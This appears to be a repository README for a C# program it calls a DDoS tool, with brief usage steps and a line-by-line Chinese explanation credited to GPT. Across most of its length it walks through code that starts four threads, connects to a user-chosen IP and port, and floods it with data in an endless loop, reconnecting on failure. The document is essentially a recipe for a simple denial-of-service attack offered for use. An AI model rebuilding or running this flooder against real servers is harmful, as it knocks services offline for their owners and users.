# DDOS-by-CS(A DDoS programing by CSharp)

# 简体中文
## 如何使用?
输入服务器IP(域名)  
输入服务器端口  
然后<kbd>回车</kbd>

# English
## How to use?
Input IP or domain name of server.  
Input the port of server.  
Then press <kbd>Enter</kbd>.
<hr>

# GPT的解析：
# 代码简介
这段代码是一个简单的DDoS（分布式拒绝服务）攻击程序，其目的是向指定的服务器发送大量的请求，以使服务器无法正常工作。这段代码使用了C#语言和.NET框架的一些库来实现。
# 代码详解
## 以下是对每行或每段代码的详细解释：
```CSharp
using System;
```
引入了System命名空间，其中包含了一些常用的基本类型和函数。
```CSharp
using System.Net;
```
引入了System.Net命名空间，其中包含了用于网络通信的类和函数。
```CSharp
using System.Net.Sockets;
```
引入了System.Net.Sockets命名空间，其中包含了用于Socket编程的类和函数。
```CSharp
using System.Threading;
```
引入了System.Threading命名空间，其中包含了用于多线程编程的类和函数。
```CSharp
class Program { ... }
```
定义了一个名为Program的类。
```CSharp
public static string IP;
```
声明了一个公共静态字符串变量IP，用于存储服务器的IP地址。
```CSharp
public static int Port;
```
声明了一个公共静态整数变量Port，用于存储服务器的端口号。
```CSharp
public static int count = 0;
```
声明了一个公共静态整数变量count，并初始化为0，用于记录发送的请求次数。
```CSharp
static void Main() { ... }
```
定义了一个静态方法Main作为程序的入口点。
```CSharp
Console.Write("服务器 | Server: ");
```
在控制台输出提示信息，要求用户输入服务器的IP地址。
```CSharp
Program.IP = Console.ReadLine();
```
将用户输入的IP地址存储到IP变量中。
```CSharp
while (true) { ... }
```
进入一个无限循环，要求用户输入服务器的端口号，直到输入的端口号符合要求为止。
```CSharp
if (int.TryParse(Console.ReadLine(), out Program.Port)) { ... }
```
尝试将用户输入的端口号转换为整数并存储到Port变量中，如果转换成功，则退出循环。
```CSharp
else { ... }
```
如果转换失败，则在控制台输出错误信息，并继续下一次循环。
```CSharp
Thread t1 = new Thread(DDOS);
```
创建一个名为t1的线程，并将DDOS方法作为参数传递给线程的构造函数。
```CSharp
Thread t2 = new Thread(DDOS);
```
创建一个名为t2的线程，并将DDOS方法作为参数传递给线程的构造函数。
```CSharp
Thread t3 = new Thread(DDOS);
```
创建一个名为t3的线程，并将DDOS方法作为参数传递给线程的构造函数。
```CSharp
Thread t4 = new Thread(DDOS);
```
创建一个名为t4的线程，并将DDOS方法作为参数传递给线程的构造函数。
```CSharp
t1.Start();
```
启动t1线程。
```CSharp
t2.Start();
```
启动t2线程。
```CSharp
t3.Start();
```
启动t3线程。
```CSharp
t4.Start();
```
启动t4线程。
```CSharp
static void DDOS() { ... }
```
定义了一个静态方法DDOS，用于执行DDoS攻击。
```CSharp
string serverIP = Program.IP;
```
将全局变量IP的值赋值给局部变量serverIP，用于存储服务器的IP地址。
```CSharp
int serverPort = Program.Port;
```
将全局变量Port的值赋值给局部变量serverPort，用于存储服务器的端口号。
```CSharp
reclient:
```
定义一个标签reclient，用于在后面的代码中进行循环跳转。
```CSharp
TcpClient client = new TcpClient();
```
创建一个TcpClient对象client，用于与服务器建立TCP连接。
```CSharp
try { ... }：尝试以下代码块中的操作。
```CSharp
client.Connect(serverIP, serverPort);
```
尝试连接到指定的服务器IP地址和端口号。
```CSharp
Console.WriteLine("服务器连接成功 | Connect success.");
```
在控制台输出连接成功的提示信息。
```CSharp
catch (Exception e) { ... }
```
如果连接失败，则捕获异常并执行以下代码块中的操作。
```CSharp
Console.ForegroundColor = ConsoleColor.Red;
```
将控制台的前景色设置为红色。
```CSharp
Console.WriteLine("服务器连接失败 | Unable to connect to server.");
```
在控制台输出连接失败的错误信息。
```CSharp
Console.ResetColor();
```
重置控制台的前景色为默认值。
```CSharp
NetworkStream stream = client.GetStream();
```
获取与服务器连接关联的网络流对象。
```CSharp
byte[] buffer = System.Text.Encoding.ASCII.GetBytes("DataDataDataDataDataData");
```
将字符串"DataDataDataDataDataData"转换为ASCII编码的字节数组，并将其存储在buffer变量中。
```CSharp
while (true) { ... }
```
进入一个无限循环，用于不断发送请求。
```CSharp
Program.count++;
```
每次循环开始时，将count变量的值加1。
```CSharp
stream.Write(buffer, 0, buffer.Length);
```
向服务器发送数据，将buffer中的字节数据写入到网络流中。
```CSharp
Console.Write("发了第" + Program.count + "次包");
```
在控制台输出发送请求的次数。
```CSharp
Console.ForegroundColor = ConsoleColor.Green;
```
将控制台的前景色设置为绿色。
```CSharp
Console.WriteLine("成功");
```
在控制台输出成功的提示信息。
```CSharp
Console.ResetColor();
```
重置控制台的前景色为默认值。
```CSharp
catch (Exception e) { ... }
```
如果发送请求时出现异常，则捕获异常并执行以下代码块中的操作。
```CSharp
Console.ForegroundColor = ConsoleColor.Red;
```
将控制台的前景色设置为红色。
```CSharp
Console.WriteLine("在发送第" + Program.count + "时发送问题" + e.Message);
```
在控制台输出发送请求时出现问题的错误信息。
```CSharp
Console.ResetColor();
```
重置控制台的前景色为默认值。
```CSharp
goto reclient;
```
跳转到标签reclient处，重新连接服务器。
## 这段代码通过多线程的方式向指定的服务器发送请求，实现了DDoS攻击的目的。每个线程都执行相同的DDOS方法，不断地连接到服务器并发送请求，直到发送请求时出现问题为止。
